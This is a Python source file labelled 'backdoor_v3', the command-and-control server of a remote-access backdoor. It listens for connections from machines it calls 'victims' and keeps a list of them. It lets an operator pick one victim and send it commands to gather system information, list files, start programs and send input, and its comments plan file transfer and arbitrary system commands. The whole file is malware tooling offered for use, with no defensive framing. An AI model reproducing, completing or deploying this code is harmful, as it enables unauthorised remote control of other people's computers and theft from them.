#backdoor_v3 by jfam421
import socket
import threading
import json
from sys import executable, argv
import os

victims = {}
ip_server = "192.168.43.187"
port_server = 1234

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((ip_server, port_server))
sock.listen(10)

def conn_vict():
    while True:
        try:
            victim, address_victim = sock.accept()
            victims[address_victim] = victim
            print(f"\n@--Connected to {address_victim}--@")
            print(victims)
        except:
            continue

def send_command(command):
    try:
        main_victim.send(bytes(command, "utf-8"))
    except ConnectionResetError:
        del_user()
        print("@--User has disconnected--@")
        
def del_user():
    for key in victims:
        if main_victim == victims[key]:
            del victims[key]

def set_vict():
    vict_dict = {} 
    if victims:
        i = 0 
        for key in victims:
            i += 1
            vict_dict[i] = (key, victims[key])
            print(f"\n{i}){key} : {victims[key]}")
        client = int(input("Select number of the client: "))
        for number in vict_dict:
            if number == client:
                global main_victim
                main_victim = vict_dict[i][1] 
    else:
        print("@--No user has connected--@")

#new functions: upload and download files
#new functions: any system command

def get_data():
    while True:
        try:
            return main_victim.recv(1024)
            break
        except:
            del_user()
            break

def shell_command():
    while True:
        command = input("###> ")
        array_command = command.split(" ")
        try:
            if command == "set_vict":
                set_vict()
            elif command == "get_info":
                send_command("get_info")
                data = json.loads(get_data().decode("utf-8"))
                print(data)
            elif command == "list":
                send_command("list")
                print(get_data().decode("utf-8"))
            elif array_command[0] == "start":
                send_command(f"start {array_command[1]}")
            elif array_command[0] == "input":
                send_command(command)
                print(get_data())
        except:
            print("@--User has disconnected--@")
            python = executable
            os.execl(python, python, * argv)

if __name__ == "__main__":
    func_1 = threading.Thread(target=conn_vict)
    func_2 = threading.Thread(target=shell_command)

    func_1.start()
    func_2.start()
